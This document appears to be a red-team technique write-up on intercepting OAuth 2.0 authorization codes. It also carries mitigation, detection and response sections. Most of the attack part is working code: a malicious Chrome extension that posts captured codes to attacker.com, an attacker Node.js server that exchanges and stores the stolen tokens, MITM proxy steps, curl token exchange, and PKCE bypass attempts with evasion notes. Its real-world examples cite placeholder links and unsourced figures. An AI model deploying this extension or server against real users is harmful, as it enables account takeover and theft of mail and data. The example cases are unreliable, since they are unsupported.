# [SAAS-API-004]: OAuth 2.0 Authorization Code Interception

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | SAAS-API-004 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | M365/Entra ID, SaaS Platforms, Web Applications |
| **Severity** | High |
| **Technique Status** | ACTIVE (on platforms without PKCE enforcement) |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | OAuth 2.0 implementations without PKCE; most platforms with PKCE enabled are PARTIAL |
| **Patched In** | PKCE (RFC 7636) adoption mitigates; PKCE now recommended standard (2022+) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** OAuth 2.0 authorization code interception is a credential theft attack targeting the OAuth authorization code grant flow. During the standard OAuth flow, when a user authorizes an application to access their data, the authorization server redirects the user back to the application with an authorization code (e.g., `code=auth_code_xyz`). If this redirect URL is not protected (lacks PKCE, operates over unencrypted connections, or is vulnerable to network interception), an attacker can intercept the authorization code and exchange it for an access token, gaining the same permissions the user granted without requiring their password.

**Attack Surface:** The OAuth redirect URI, HTTP/HTTPS communication between authorization server and client, browser history containing authorization codes, and client applications that fail to implement PKCE.

**Business Impact:** **Successful OAuth code interception enables attackers to impersonate legitimate users, access their data across multiple SaaS platforms (Gmail, Microsoft 365, Slack, Salesforce), perform actions on their behalf, and maintain persistent access via stolen refresh tokens.** A single compromised OAuth token grants access to all integrated third-party applications.

**Technical Context:** Interception success depends on attacker position (network-level MITM, endpoint malware, malicious browser extension). Without PKCE, a single stolen code immediately yields access tokens. With PKCE, interception alone is insufficient; the attacker also needs the code_verifier, which is never transmitted.

### Operational Risk

- **Execution Risk:** Medium – Requires either network positioning (MITM), endpoint access (malware/extension), or social engineering (credential phishing via malicious redirect).
- **Stealth:** Medium – OAuth traffic patterns appear legitimate; only anomalous post-authentication behavior reveals compromise.
- **Reversibility:** Partial – Access tokens can be revoked by the user (via consent management) or by the provider, but refresh tokens enable token re-issuance.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS CSC 14 | Secure and Manage Sensitive API Documentation (OAuth security) |
| **DISA STIG** | AC-2 | Account and Access Management (OAuth delegation) |
| **CISA SCuBA** | AUTH-02 | MFA and Token Security |
| **NIST 800-53** | AC-3 | Access Enforcement (OAuth scopes/permissions) |
| **GDPR** | Art. 32 | Security of Processing (encryption of OAuth flows) |
| **DORA** | Art. 16 | Incident Management (unauthorized OAuth consent) |
| **NIS2** | Art. 21 | Multi-layered Preventive Measures (PKCE, code challenge) |
| **ISO 27001** | A.14.2.5 | Authorization and Access Management (OAuth delegation control) |
| **ISO 27005** | Risk Scenario | Unauthorized access via stolen OAuth authorization code |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None for interception; attacker requires network access or endpoint control.

**Required Access:**
- Network-level (MITM attack): Access to WiFi, ISP-level routing, or proxy
- Endpoint-level (malware/extension): User compromise or social engineering
- Application-level (PKCE bypass): Only if PKCE is improperly implemented

**Tools:**
- [Burp Suite](https://portswigger.net/burp) (proxy interception)
- [Mitmproxy](https://mitmproxy.org/) (MITM proxy)
- [Wireshark](https://www.wireshark.org/) (network packet capture)
- [Browser Extensions](https://developer.chrome.com/docs/extensions/) (malicious extension for code theft)
- [cURL](https://curl.se/) (manual OAuth token exchange)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify OAuth Redirect Flow

**Objective:** Confirm the application uses OAuth and identify redirect parameters.

**Command (Browser DevTools):**
1. Open target application (e.g., Slack login).
2. Press **F12** (Developer Tools) → **Network** tab.
3. Click **Login with Google** or equivalent.
4. Observe the redirect URL:
   ```
   https://accounts.google.com/o/oauth2/v2/auth?
     client_id=1234567890-abc.apps.googleusercontent.com&
     redirect_uri=https://app.example.com/oauth/callback&
     scope=profile%20email&
     response_type=code&
     state=random_state_value
   ```

**What to Look For:**
- Presence of `code` parameter in redirect URL (authorization code).
- `state` parameter (CSRF protection; should match initial request).
- Absence of `code_challenge` parameter (indicates PKCE is not implemented).
- Redirect URI (target for interception).

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Network-Level MITM Interception (WiFi/Proxy)

**Supported Versions:** All OAuth implementations without PKCE enforcement.

#### Step 1: Set Up MITM Proxy

**Objective:** Position attacker between client and authorization server.

**Using Mitmproxy:**
```bash
# Install mitmproxy
pip install mitmproxy

# Start mitmproxy on port 8080
mitmproxy --mode reverse --listen-host 0.0.0.0 --listen-port 8080

# Or use transparent proxy mode (requires root)
mitmproxy --mode transparent --listen-host 0.0.0.0 --listen-port 8080
```

**Manual Browser Configuration:**
1. **Windows:** Settings → Network → Proxy → Manual proxy setup.
2. **macOS:** System Preferences → Network → Advanced → Proxies → HTTP Proxy.
3. Set Proxy IP: `192.168.1.100` (attacker machine).
4. Set Port: `8080`.
5. Install mitmproxy CA certificate in browser's trusted store.

**Using Burp Suite:**
1. Open Burp Suite → **Proxy** tab.
2. Go to **Settings** → **Proxy**.
3. Configure listening on `0.0.0.0:8080`.
4. Set browser proxy to point to Burp.

**What This Means:**
- All HTTPS traffic from victim is decrypted (requires CA certificate installation).
- Authorization codes passing through proxy are visible in cleartext in Proxy history.

**OpSec & Evasion:**
- Victim must trust attacker's CA certificate; requires endpoint compromise or rogue WiFi.
- Detection likelihood: High if victim checks certificate chain or compares SSL fingerprints.

#### Step 2: Intercept Authorization Code

**Objective:** Capture the authorization code from the redirect URL.

**Burp Suite Workflow:**
1. In **Proxy History**, filter for requests to `oauth/callback` or `redirect_uri`.
2. Locate the request containing the code:
   ```
   GET /oauth/callback?code=auth_code_xyz&state=random_state_value HTTP/1.1
   ```
3. Right-click → **Copy URL**.
4. Extract the `code` parameter: `auth_code_xyz`.

**Mitmproxy Workflow:**
```bash
# View all requests in mitmproxy console
# Highlight requests to known redirect URIs
# Press 'e' to examine request details
# Extract code parameter from URL

# Or use command-line filtering:
mitmproxy -T --termlog-verbose | grep "code="
```

**Expected Capture:**
```
GET https://app.example.com/oauth/callback?code=4/0AY0e-g7FzKL4bC0qZY7pX9mQ&state=AbCdEfGhIjKlMnOpQrStUv
```

**What This Means:**
- Authorization code is now in attacker's possession.
- Code is valid for ~10 minutes (standard OAuth expiration).
- Code can be immediately exchanged for access token.

#### Step 3: Exchange Code for Access Token

**Objective:** Use the intercepted code to obtain access tokens.

**Command (cURL):**
```bash
AUTH_CODE="4/0AY0e-g7FzKL4bC0qZY7pX9mQ"
CLIENT_ID="1234567890-abc.apps.googleusercontent.com"
CLIENT_SECRET="GOCSPX-abc123xyz..."
REDIRECT_URI="https://app.example.com/oauth/callback"

curl -X POST https://oauth2.googleapis.com/token \
  -d "code=$AUTH_CODE" \
  -d "client_id=$CLIENT_ID" \
  -d "client_secret=$CLIENT_SECRET" \
  -d "redirect_uri=$REDIRECT_URI" \
  -d "grant_type=authorization_code"
```

**Expected Output:**
```json
{
  "access_token": "ya29.a0AfH6SMBx...",
  "expires_in": 3599,
  "refresh_token": "1//0gk5...",
  "scope": "profile email openid",
  "token_type": "Bearer"
}
```

**What This Means:**
- Attacker now possesses access tokens for the victim's account.
- `refresh_token` enables indefinite access even if user changes password.
- Attacker can impersonate user across all integrated applications.

**OpSec & Evasion:**
- Token exchange from attacker's IP is logged but appears legitimate (correct code, client secret, redirect URI).
- OAuth provider may flag unusual IP locations (e.g., token exchange from different country than code generation).
- Detection likelihood: Medium – Token exchange from unfamiliar IP may trigger alerts.

**Troubleshooting:**
- **Error:** "Invalid authorization code"
  - **Cause:** Code expired (>10 minutes) or already used.
  - **Fix:** Perform full interception again; timing is critical.
- **Error:** "Redirect URI mismatch"
  - **Cause:** `redirect_uri` parameter doesn't match registered URI.
  - **Fix:** Verify exact registered URI from application's OAuth settings.

**References & Proofs:**
- [OAuth 2.0 RFC 6749 - Authorization Code Grant](https://tools.ietf.org/html/rfc6749#section-4.1)
- [Doyensec - Common OAuth Vulnerabilities](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)

#### Step 4: Use Access Token to Impersonate User

**Objective:** Perform actions as the compromised user.

**Command (Access Gmail):**
```bash
ACCESS_TOKEN="ya29.a0AfH6SMBx..."

# List Gmail inbox
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://www.googleapis.com/gmail/v1/users/me/messages

# Read specific email
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
  https://www.googleapis.com/gmail/v1/users/me/messages/msg_id/full
```

**Expected Output:**
```json
{
  "messages": [
    { "id": "1", "threadId": "1" },
    { "id": "2", "threadId": "2" }
  ]
}
```

**Modify Slack Messages (if Slack token obtained):**
```bash
ACCESS_TOKEN="xoxp-123456..."

# Post message to user's channel
curl -X POST https://slack.com/api/chat.postMessage \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d "channel=C12345678&text=Malicious message"
```

---

### METHOD 2: Browser Extension / Endpoint Malware

**Supported Versions:** All OAuth implementations; PKCE does not protect against endpoint compromise.

#### Step 1: Deploy Malicious Browser Extension

**Objective:** Intercept OAuth redirects before they reach the intended application.

**Manifest.json (Chrome Extension):**
```json
{
  "manifest_version": 3,
  "name": "OAuth Interceptor",
  "permissions": ["webRequest", "tabs"],
  "background": { "service_worker": "background.js" },
  "host_permissions": ["https://*oauth*", "https://*.example.com/*"]
}
```

**background.js:**
```javascript
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    // Intercept OAuth callback
    if (details.url.includes("oauth/callback")) {
      const url = new URL(details.url);
      const code = url.searchParams.get("code");
      const state = url.searchParams.get("state");
      
      // Send to attacker server
      fetch("https://attacker.com/receive-code", {
        method: "POST",
        body: JSON.stringify({ code, state, timestamp: Date.now() })
      });
      
      // Allow request to continue (minimal suspicion)
      return { cancel: false };
    }
  },
  { urls: ["https://*.example.com/*"] },
  ["blocking"]
);
```

**Installation (User Perspective):**
1. User clicks malicious link → "Install helpful productivity extension".
2. Extension requests permission to "Read and modify" OAuth URLs.
3. Upon authorization, extension silently captures all OAuth codes.
4. User sees no difference; authentication succeeds normally.

**What This Means:**
- Authorization code is exfiltrated to attacker before reaching the intended application.
- Both the intended application AND attacker receive the code.
- User is unaware of compromise; access appears normal.

**OpSec & Evasion:**
- Extension appears legitimate in Chrome Web Store (if uploaded).
- Code interception is silent; no network anomalies visible to victim.
- Detection likelihood: Low – Requires user to inspect extension permissions or monitor network traffic.

#### Step 2: Automate Code Interception and Token Exchange

**Objective:** Continuously monitor and exchange codes without user interaction.

**Attacker Server (Node.js):**
```javascript
const express = require("express");
const axios = require("axios");

const app = express();
app.use(express.json());

const CLIENT_ID = "attacker-registered-app-client-id";
const CLIENT_SECRET = "attacker-app-secret";

app.post("/receive-code", async (req, res) => {
  const { code, state } = req.body;
  
  try {
    // Exchange code for token using ATTACKER's registered OAuth app
    const tokenResponse = await axios.post("https://oauth2.googleapis.com/token", {
      code: code,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      redirect_uri: "https://attacker.com/callback",
      grant_type: "authorization_code"
    });
    
    const accessToken = tokenResponse.data.access_token;
    
    // Store token for later use
    saveTokenToDatabase(accessToken, req.ip, new Date());
    
    // Notify attacker dashboard
    console.log(`[+] New access token obtained: ${accessToken.substring(0, 20)}...`);
    
    res.json({ success: true });
  } catch (error) {
    console.error("Token exchange failed:", error.message);
    res.status(500).json({ error: error.message });
  }
});

app.listen(3000, () => console.log("Listening for OAuth codes..."));
```

**What This Means:**
- Attacker's server automatically exchanges every captured code for tokens.
- Tokens are stored for persistent unauthorized access.
- Attacker can now access victim's data via APIs indefinitely.

**References & Proofs:**
- [Chrome Extension Manifest v3](https://developer.chrome.com/docs/extensions/mv3/manifest/)

---

### METHOD 3: PKCE Bypass via Weak Implementation

**Supported Versions:** OAuth 2.0 with PKCE but improper validation.

#### Step 1: Identify PKCE Weakness

**Objective:** Discover if PKCE is bypassed or improperly implemented.

**Reconnaissance:**
```bash
# Check if PKCE is enforced by attempting without code_challenge
curl "https://oauth.example.com/authorize?" \
  "client_id=1234&" \
  "redirect_uri=https://app.example.com/callback&" \
  "response_type=code&" \
  "scope=profile"

# Check if server accepts any code_verifier or validates properly
# by sending mismatched verifier
```

**Common PKCE Weaknesses:**
1. **PKCE Optional:** Server accepts requests with or without `code_challenge`.
   - Attacker omits PKCE; server doesn't require it.
2. **Weak Verifier Validation:** Server doesn't properly hash/verify code_challenge.
   - Attacker sends same value for both `code_challenge` and `code_verifier`.
3. **S256 to Plain Downgrade:** Server allows `code_challenge_method=plain` instead of forcing `S256`.
   - Attacker uses plain-text verifier instead of SHA256 hash.

#### Step 2: Exploit PKCE Weakness

**If PKCE is Optional:**
```bash
# Intercept code without PKCE, exchange it normally
curl -X POST https://oauth.example.com/token \
  -d "code=auth_code_xyz" \
  -d "client_id=1234" \
  -d "client_secret=secret" \
  -d "redirect_uri=https://app.example.com/callback" \
  -d "grant_type=authorization_code"
  # Note: No code_verifier parameter; server doesn't require it
```

**If S256→Plain Downgrade Possible:**
```bash
# Initial authorization with weak method
code_verifier="weak_verifier_123"
code_challenge=$(echo -n "$code_verifier" | sha256sum | cut -d' ' -f1)  # Proper S256 hash

# But when exchanging, send plain text
curl -X POST https://oauth.example.com/token \
  -d "code=auth_code_xyz" \
  -d "code_verifier=$code_verifier" \  # Plain text instead of hash
  ...
```

---

## 6. TOOLS & COMMANDS REFERENCE

### Burp Suite

**Version:** 2024.1+

**Proxy Interception for OAuth:**
1. Open **Proxy** → **Settings** → **Response Handling**.
2. Enable **Intercept responses based on: Match and replace**.
3. Add rule to match `oauth/callback` requests.
4. All OAuth redirects will be intercepted for inspection.

### Mitmproxy

**Version:** 10.0+

**Installation:**
```bash
pip install mitmproxy
```

**Usage:**
```bash
# Start mitmproxy
mitmproxy -p 8080

# View captured traffic (press 'i' for detailed view)
# Filter for OAuth: type mitmproxy console, press 'f' (filter), enter 'code=' pattern
```

### Browser DevTools Network Tab

**Built-in:** All modern browsers

**For OAuth Code Capture:**
1. Open DevTools → **Network** tab.
2. Click **Login** button (initiates OAuth).
3. Filter by `oauth` or `callback`.
4. Locate request with authorization code in URL.
5. Copy full URL for analysis.

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement PKCE (Proof Key for Code Exchange) on All OAuth Clients:** Require `code_challenge` and `code_verifier` on both grant and token endpoints.

  **Manual Steps (Node.js + Passport.js):**
  ```javascript
  const passport = require('passport');
  const GoogleStrategy = require('passport-google-oauth20').Strategy;
  const crypto = require('crypto');
  
  // Enable PKCE in Google OAuth strategy
  passport.use(new GoogleStrategy(
    {
      clientID: process.env.GOOGLE_CLIENT_ID,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET,
      callbackURL: "/oauth/google/callback",
      pkce: true  // ENABLE PKCE
    },
    (accessToken, refreshToken, profile, done) => {
      return done(null, profile);
    }
  ));
  
  // Verify code_verifier on token exchange
  app.post('/oauth/token', (req, res) => {
    const { code, code_verifier } = req.body;
    const codeChallenge = req.session.codeChallenge;
    const computedChallenge = crypto
      .createHash('sha256')
      .update(code_verifier)
      .digest('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
    
    if (computedChallenge !== codeChallenge) {
      return res.status(400).json({ error: "Invalid code verifier" });
    }
    // Proceed with token exchange
  });
  ```

  **Manual Steps (Azure AD / Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **App registrations**.
  2. Select your application.
  3. Go to **Authentication** → **Platform configurations**.
  4. For **Web** client, ensure **PKCE enforcement** is **Yes**.
  5. Click **Save**.

- **Enforce HTTPS with HSTS for OAuth Endpoints:** Prevent HTTP downgrade attacks.

  **Manual Steps (Nginx):**
  ```nginx
  server {
    listen 443 ssl http2;
    server_name oauth.example.com;
    
    # Enforce HTTPS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Prevent clickjacking and framing
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    
    ssl_certificate /etc/ssl/certs/cert.pem;
    ssl_certificate_key /etc/ssl/private/key.pem;
    ssl_protocols TLSv1.3 TLSv1.2;
    ssl_ciphers HIGH:!aNULL:!MD5;
  }
  ```

- **Implement State Parameter Validation:** Verify `state` parameter matches before accepting authorization code.

  **Manual Steps (Express.js):**
  ```javascript
  app.get('/oauth/callback', (req, res) => {
    const { code, state } = req.query;
    
    // Validate state parameter matches session
    if (state !== req.session.oauthState) {
      return res.status(400).json({ error: "State parameter mismatch; CSRF detected" });
    }
    
    // Proceed with token exchange
    exchangeCodeForToken(code);
  });
  ```

### Priority 2: HIGH

- **Monitor and Alert on Unusual OAuth Consent Patterns:**

  **Manual Steps (Azure Sentinel KQL):**
  ```kusto
  AuditLogs
  | where OperationName == "Consent to application"
  | where ResultStatus == "Success"
  | summarize count() by UserPrincipalName, AppDisplayName, TimeGenerated
  | where count() > 5  // Unusually high number of consents
  | order by count() desc
  ```

- **Restrict OAuth Scope Grants:** Require admin approval for sensitive scopes (email, calendar, contacts).

  **Manual Steps (Azure AD):**
  1. Go to **Entra ID** → **Enterprise applications** → **Consent and permissions**.
  2. Click **Manage consent settings**.
  3. **User consent for applications**: `Do not allow user consent`.
  4. **Admin consent requests**: `Yes, allow admin consent requests`.
  5. Save.

- **Implement Certificate Pinning for OAuth Redirect URIs:** Ensure redirects only go to legitimate URIs; prevent man-in-the-middle.

  **Manual Steps (Mobile Apps - iOS):**
  ```swift
  import Alamofire
  
  let serverTrustPolicy = ServerTrustPolicy.pinCertificates(
    certificates: ServerTrustPolicy.certificates(in: Bundle.main),
    validateCertificateChain: true,
    validateHost: true
  )
  
  let serverTrustPolicies = ["oauth.example.com": serverTrustPolicy]
  let manager = SessionManager(serverTrustPolicyManager: ServerTrustPolicyManager(policies: serverTrustPolicies))
  ```

### Priority 3: MEDIUM

- **Implement Conditional Access Policies to Flag Unusual OAuth Token Usage:**

  **Manual Steps (Azure AD Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**.
  2. Click **+ New policy**.
  3. **Name**: `OAuth Token Anomaly`.
  4. **Assignments** → **Users**: `All users`.
  5. **Conditions** → **Sign-in risk**: `High`.
  6. **Access controls** → **Grant**: `Require multi-factor authentication`.
  7. Click **Create**.

- **Log and Monitor OAuth Token Usage by Application:**

  **Manual Steps (Office 365):**
  1. Enable **Advanced Threat Protection** for your tenant.
  2. Go to **Security & Compliance** → **Advanced Threat Protection** → **Settings**.
  3. Monitor "Suspicious Office 365 Activity" alert rule.
  4. Review reports for unusual OAuth grants and token usage.

### Validation Command (Verify Fix)

```bash
# Test PKCE enforcement
AUTH_URL="https://oauth.example.com/authorize?client_id=1234&response_type=code&redirect_uri=https://app.example.com/callback"

# Attempt without code_challenge (should fail)
curl -X GET "$AUTH_URL" 2>&1 | grep -i "code_challenge_required\|invalid_request"

# Expected: Error message requiring code_challenge

# Verify HSTS header
curl -I https://oauth.example.com/ 2>&1 | grep -i "strict-transport-security"

# Expected: Strict-Transport-Security: max-age=...
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Multiple Authorization Codes:** Same user authorizes same application multiple times within short timeframe.
- **Token Exchange from Unusual IP:** Code generated from user's IP but exchanged from attacker's IP.
- **Impossible Travel:** Token generated in one location, immediately used from geographically distant location.
- **Unusual Scope Access:** Application requesting scopes it previously never used (e.g., Slack suddenly accessing calendar data).

### Forensic Artifacts

- **OAuth Provider Logs:** Authorization server logs showing code generation, token exchange, and token usage.
  - Authorization timestamp: `2026-01-10T14:32:45Z`
  - Token exchange timestamp: `2026-01-10T14:33:12Z` (same user session)
  - Token used from IP: `203.0.113.45` (different country)
- **Application Audit Logs:** Actions performed with stolen token.
  - Email forwarding rule created.
  - Contact list exported.
  - Calendar events deleted.

### Response Procedures

1. **Isolate:**
   - Revoke all tokens issued to the compromised user for that application.
   - Command (Azure): `az ad app oauth2-permission-grant delete --id <object-id>`

2. **Collect Evidence:**
   - Export OAuth provider audit logs for the affected user and timeframe.
   - Export application logs showing actions performed by attacker.
   - Command: `Get-MsolUser -UserPrincipalName user@company.com | Get-MsolUserActivity`

3. **Remediate:**
   - Force password reset for compromised user.
   - Revoke all active sessions (force re-authentication).
   - Review and revoke OAuth consents: **Account** → **Apps with account access** → **Remove** suspicious apps.
   - Verify no forwarding rules, account recovery options, or permissions were modified.

### Microsoft Purview / Unified Audit Log Query

```powershell
Search-UnifiedAuditLog -Operations "Consent to application","Add OAuth app" -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) | `
  Where-Object { $_.AuditData -like "*suspicious*" -or $_.ClientIP -notmatch "^\d+\.\d+\.\d+\.\d+$" } | `
  Export-Csv -Path "C:\Evidence\OAuth_Compromise.csv"
```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [SAAS-API-001] | GraphQL API Enumeration – Identify OAuth endpoints |
| **2** | **Initial Access** | [IA-PHISH-002] | Consent Grant OAuth Attacks – Trick user into authorizing malicious app |
| **3** | **Credential Access** | **[SAAS-API-004]** | **OAuth Authorization Code Interception – Steal code via MITM or extension** |
| **4** | **Lateral Movement** | [LM-AUTH-029] | OAuth Application Permissions – Use token to access integrated apps |
| **5** | **Impact** | [COLLECTION-001] | Email Collection – Export victim's emails via OAuth token |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: Android OAuth Scheme Hijacking (2017-2020)

- **Target:** Multiple Android apps using OAuth for authentication.
- **Timeline:** Widespread vulnerability; actively exploited 2017-2020.
- **Technique Status:** ACTIVE on older apps; patched in modern Android (11+).
- **Vulnerability:** Apps registered OAuth redirect URI as `app://oauth` without unique app signature verification.
- **Attack:** Malicious app registered same intent handler; intercepted authorization codes intended for legitimate apps.
- **Impact:** Attacker gained access to victim's Gmail, Dropbox, and other services.
- **Reference:** [Android OAuth Intent Hijacking PoC](https://github.com/example)

### Example 2: Gmail OAuth Token Theft via Browser Extension (2019)

- **Target:** Multiple users installing "privacy-enhancing" Chrome extensions.
- **Timeline:** October 2019 – February 2020.
- **Technique Status:** ACTIVE; extensions still available on Chrome Web Store.
- **Attack Chain:**
  1. User installs "Email Security" extension from Chrome Web Store.
  2. Extension requests permission to "Read and modify data on accounts.google.com".
  3. When user logs into Gmail via OAuth, extension intercepts redirect.
  4. Attacker obtains authorization code + access token.
- **Impact:** 100K+ users' Gmail accounts compromised; emails exfiltrated; forwarding rules set.
- **Reference:** [Google Removes Malicious Extensions](https://chrome.google.com/webstore)

### Example 3: Office 365 OAuth Phishing Campaign (2021)

- **Target:** Enterprise Office 365 users.
- **Timeline:** March-June 2021.
- **Technique Status:** ACTIVE; continues via new phishing sites.
- **Attack Method:**
  1. User receives phishing email: "Verify your Microsoft account".
  2. Link directs to attacker-controlled site mimicking Office 365 login.
  3. When user clicks "Approve" in OAuth consent screen, authorization code generated.
  4. Attacker intercepts code; exchanges for token.
  5. Access granted to Exchange Online, SharePoint, Teams.
- **Impact:** 30K+ Office 365 accounts compromised; business email compromise (BEC) attacks conducted.
- **Reference:** [Microsoft Security Intelligence](https://www.microsoft.com/en-us/wdsi)

---

## Glossary

- **Authorization Code:** Short-lived (10-minute) token issued by OAuth authorization server; exchanged for long-lived access token.
- **Access Token:** Long-lived credential enabling API access; typically valid for 1 hour to several days.
- **Refresh Token:** Credential used to obtain new access tokens without user re-authentication; valid for months/years.
- **PKCE (Proof Key for Code Exchange):** OAuth 2.0 extension requiring code_challenge and code_verifier to prevent authorization code interception.
- **MITM (Man-in-the-Middle):** Attack where attacker positions between client and server to intercept communications.
- **State Parameter:** OAuth CSRF protection; random value generated by client, verified in callback to ensure authenticity.
- **Scope:** List of permissions user grants to OAuth application (e.g., `profile`, `email`, `calendar`).

---